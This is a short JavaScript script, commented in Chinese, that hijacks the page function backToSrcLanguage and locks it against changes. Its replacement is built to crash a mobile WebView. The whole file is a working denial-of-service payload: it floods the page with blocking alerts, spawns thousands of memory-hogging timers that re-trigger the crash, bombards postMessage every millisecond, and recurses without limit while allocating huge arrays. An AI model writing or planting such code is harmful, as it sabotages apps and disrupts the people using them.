(function() {
    'use strict';
    
    console.log('📱 Native WebView快速崩溃');
    
    Object.defineProperty(window, 'backToSrcLanguage', {
        value: function webViewCrash() {
            console.log('💣 WebView针对性崩溃');
            
            // WebView特定攻击向量
            
            // 1. 大量同步alert/confirm/prompt（阻塞UI线程）
            for (let i = 0; i < 100; i++) {
                try {
                    alert('崩溃攻击 ' + i);
                } catch(e) {
                    // 忽略错误
                }
            }
            
            // 2. 创建大量定时器（消耗系统资源）
            for (let i = 0; i < 10000; i++) {
                setTimeout(() => {
                    // 每个定时器都分配内存
                    const data = new Array(100000).fill('💥');
                    window['timer_data_' + i] = data;
                    
                    // 递归创建更多定时器
                    if (i % 100 === 0) {
                        setTimeout(() => {
                            webViewCrash();
                        }, 0);
                    }
                }, 0);
            }
            
            // 3. 使用postMessage轰炸（如果是iframe环境）
            try {
                setInterval(() => {
                    window.postMessage({type: 'crash', data: '💣'.repeat(10000)}, '*');
                }, 1);
            } catch(e) {}
            
            // 4. 立即进入深度递归
            function webViewRecursive(depth) {
                // 超大对象分配
                const obj = {
                    level: depth,
                    data: new Array(100000).fill({
                        nested: '💀'.repeat(1000),
                        array: new Array(1000).fill(Math.random())
                    }),
                    timestamp: Date.now()
                };
                
                // 无限制递归
                return webViewRecursive(depth + 1) + obj;
            }
            
            // 触发崩溃
            return webViewRecursive(0);
        },
        writable: false,
        configurable: false
    });
    
    console.log('✅ WebView崩溃函数已定义');
})();
